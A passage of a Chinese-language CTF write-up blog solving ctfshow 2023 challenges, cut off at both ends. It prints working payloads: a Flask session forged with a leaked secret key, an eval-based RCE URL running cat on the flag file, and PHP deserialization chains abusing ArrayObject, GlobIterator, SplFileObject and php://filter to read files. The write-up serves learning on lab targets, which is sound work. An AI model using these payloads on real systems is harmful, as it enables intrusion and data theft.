class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo Y2F0IC9mbGFn | base64 -d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>拿到flag</p><h1 id="2023愚人杯easy-flask"><a href="#2023愚人杯easy-flask" class="headerlink" title="2023愚人杯easy-flask"></a>2023愚人杯easy-flask</h1><p>进入看见登录框尝试sql，xss，ssti没结果</p><p>发现admin账号提示密码错误，注册账号进去看看</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150714144.png" alt="1"></p><p>提示我们是user，再learn看见密码是S3cr3tK3y</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150747281.png" alt="image-20250122150747281"></p><p>爆破session,拿到</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>-&gt; &#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>修改为admin用密钥加密,替换元素session</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxIn0<span class="hljs-selector-class">.Z5CcCA</span>.IZ_i9nESqDbObpSXrK72b8-VfZ8<br></code></pre></td></tr></table></figure><p>伪造成功看见一个下载</p><p>​<img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152102290.png" alt="image-20250122152102290"></p><p>但是下载是一些没用的faskflag</p><p>抓包发现存在任意文件下载，下载源码看看&#x2F;app&#x2F;app.py绝对路径</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152504059.png" alt="image-20250122152504059"></p><p>发现hello目录存在rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/hello?<span class="hljs-built_in">eval</span>=__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag_is_h3re &#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p>导入os库拿到flag</p><h1 id="2023愚人杯easy-php"><a href="#2023愚人杯easy-php" class="headerlink" title="2023愚人杯easy-php"></a>2023愚人杯easy-php</h1><p>pop链，链子很简单，但是不能用O，a开头也就是不能用数组绕过</p><p>查了下资料，要用实现了<code>Serializable</code> 接口的原生类来构造</p><p>查找实现了serializable接口的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br><br>    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br><br>            <span class="hljs-string">&#x27;unserialize&#x27;</span>,<br><br>        ))) &#123;<br><br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>        &#125;<br><br>    &#125;&#125;<br></code></pre></td></tr></table></figure><p>虽然在低版本的时候可以在Oa后面加+绕过但是这里不行，版本应该在7.4+</p><p>所有payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfshow;<br><span class="hljs-variable">$a</span>-&gt;ctfshow=<span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$oa</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$oa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-meta">?&gt;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>注意：不要再phpstorm运行代码，不然会以O开头在本地原始环境运行</p></blockquote><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">78</span>:&#123;x:i:<span class="hljs-number">0</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;cat /f*&quot;</span>;&#125;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="解释为什么不会触发-wakeup"><a href="#解释为什么不会触发-wakeup" class="headerlink" title="解释为什么不会触发__wakeup()"></a>解释为什么不会触发__wakeup()</h2><p>O标识符代表对象类型，而C标识符代表类名类型。如果将C替换为O，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。这样一来，在反序列化时，__wakeup魔术方法就不会触发，简单来说就是wakeup只对对象有效</p><h1 id="2023愚人杯被遗忘的反序列化"><a href="#2023愚人杯被遗忘的反序列化" class="headerlink" title="2023愚人杯被遗忘的反序列化"></a>2023愚人杯被遗忘的反序列化</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># 当前目录中有一个txt文件哦</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;check.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;text == <span class="hljs-string">&quot;aaaa&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">lcfirst</span>(<span class="hljs-variable">$this</span>-&gt;text);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$kk</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> cycycycy;<br>        <span class="hljs-variable">$a</span> -&gt; <span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>];<br>        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">cipher</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$get</span> === <span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;eval&quot;</span>]);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a_a</span> = <span class="hljs-variable language_">$this</span> -&gt; a;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a_a\$&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;   <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="hljs-variable">$this</span> -&gt; key))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span> -&gt; file);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不行哦&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;aaa;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; aaa = <span class="hljs-keyword">clone</span> <span class="hljs-keyword">new</span> EeE;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_AAAAAA&quot;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_ip</span>);<br></code></pre></td></tr></table></figure><p>首先是通过header头传参的 比较新奇</p><p>好多函数没定义肯定先要读.txt文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类中coos和file都可控，那么就可以利用php原生类来读取文件</p><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p>GlobIterator 类也可以遍历一个文件目录，但与上面略不同的是其行为类似于 <a href="https://so.csdn.net/so/search?q=glob&spm=1001.2101.3001.7020">glob</a>()，可以通过模式匹配来寻找文件路径。</p><p>它的特点就是，只需要知道部分名称就可以进行遍历</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;*txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;GlobIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>拿到文件名加<code>h1nt.txt</code></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p>拿到文件名那我们直接使用SplFileObject原生类直接读</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>但是只有</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122162120344.png" alt="image-20250122162120344"></p><p>应该是注释掉了，使用伪协议读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>解码后得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#用于check.php</span><br><br><span class="hljs-attribute">key</span>：qwertyuiopasdfghjklzxcvbnm123456789<br><br><span class="hljs-attribute">move</span>：<span class="hljs-number">2</span>~<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>但是不知道有什么用</p><p>尝试使用原生类扫目录试试</p><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h2><p><code>glob:///f*</code>，这是一个 PHP 的流包装器，用于匹配根目录下的所有f开头的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;glob:///f*&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;DirectoryIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>找到flag的文件是f1agaaa</p><p>使用伪协议读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=f1agaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>拿到flag</p><p>官方wp是flag文件是不知道的要结合给出的key和move去爆破</p><p>官方解释：</p><p>其中move是移动的意思，猜测这是一个移位的加密，其中猜测key是范围那么就有向左就有3种可能， 向右也有3种可能 但是提示2提示我们random-随机，那么加密可能是2~7随机，那么每次正好相等就是1&#x2F;24的几率</p><p>之后就想办法构造链子触发利用<code>eval</code>函数了</p><figure class="highlight 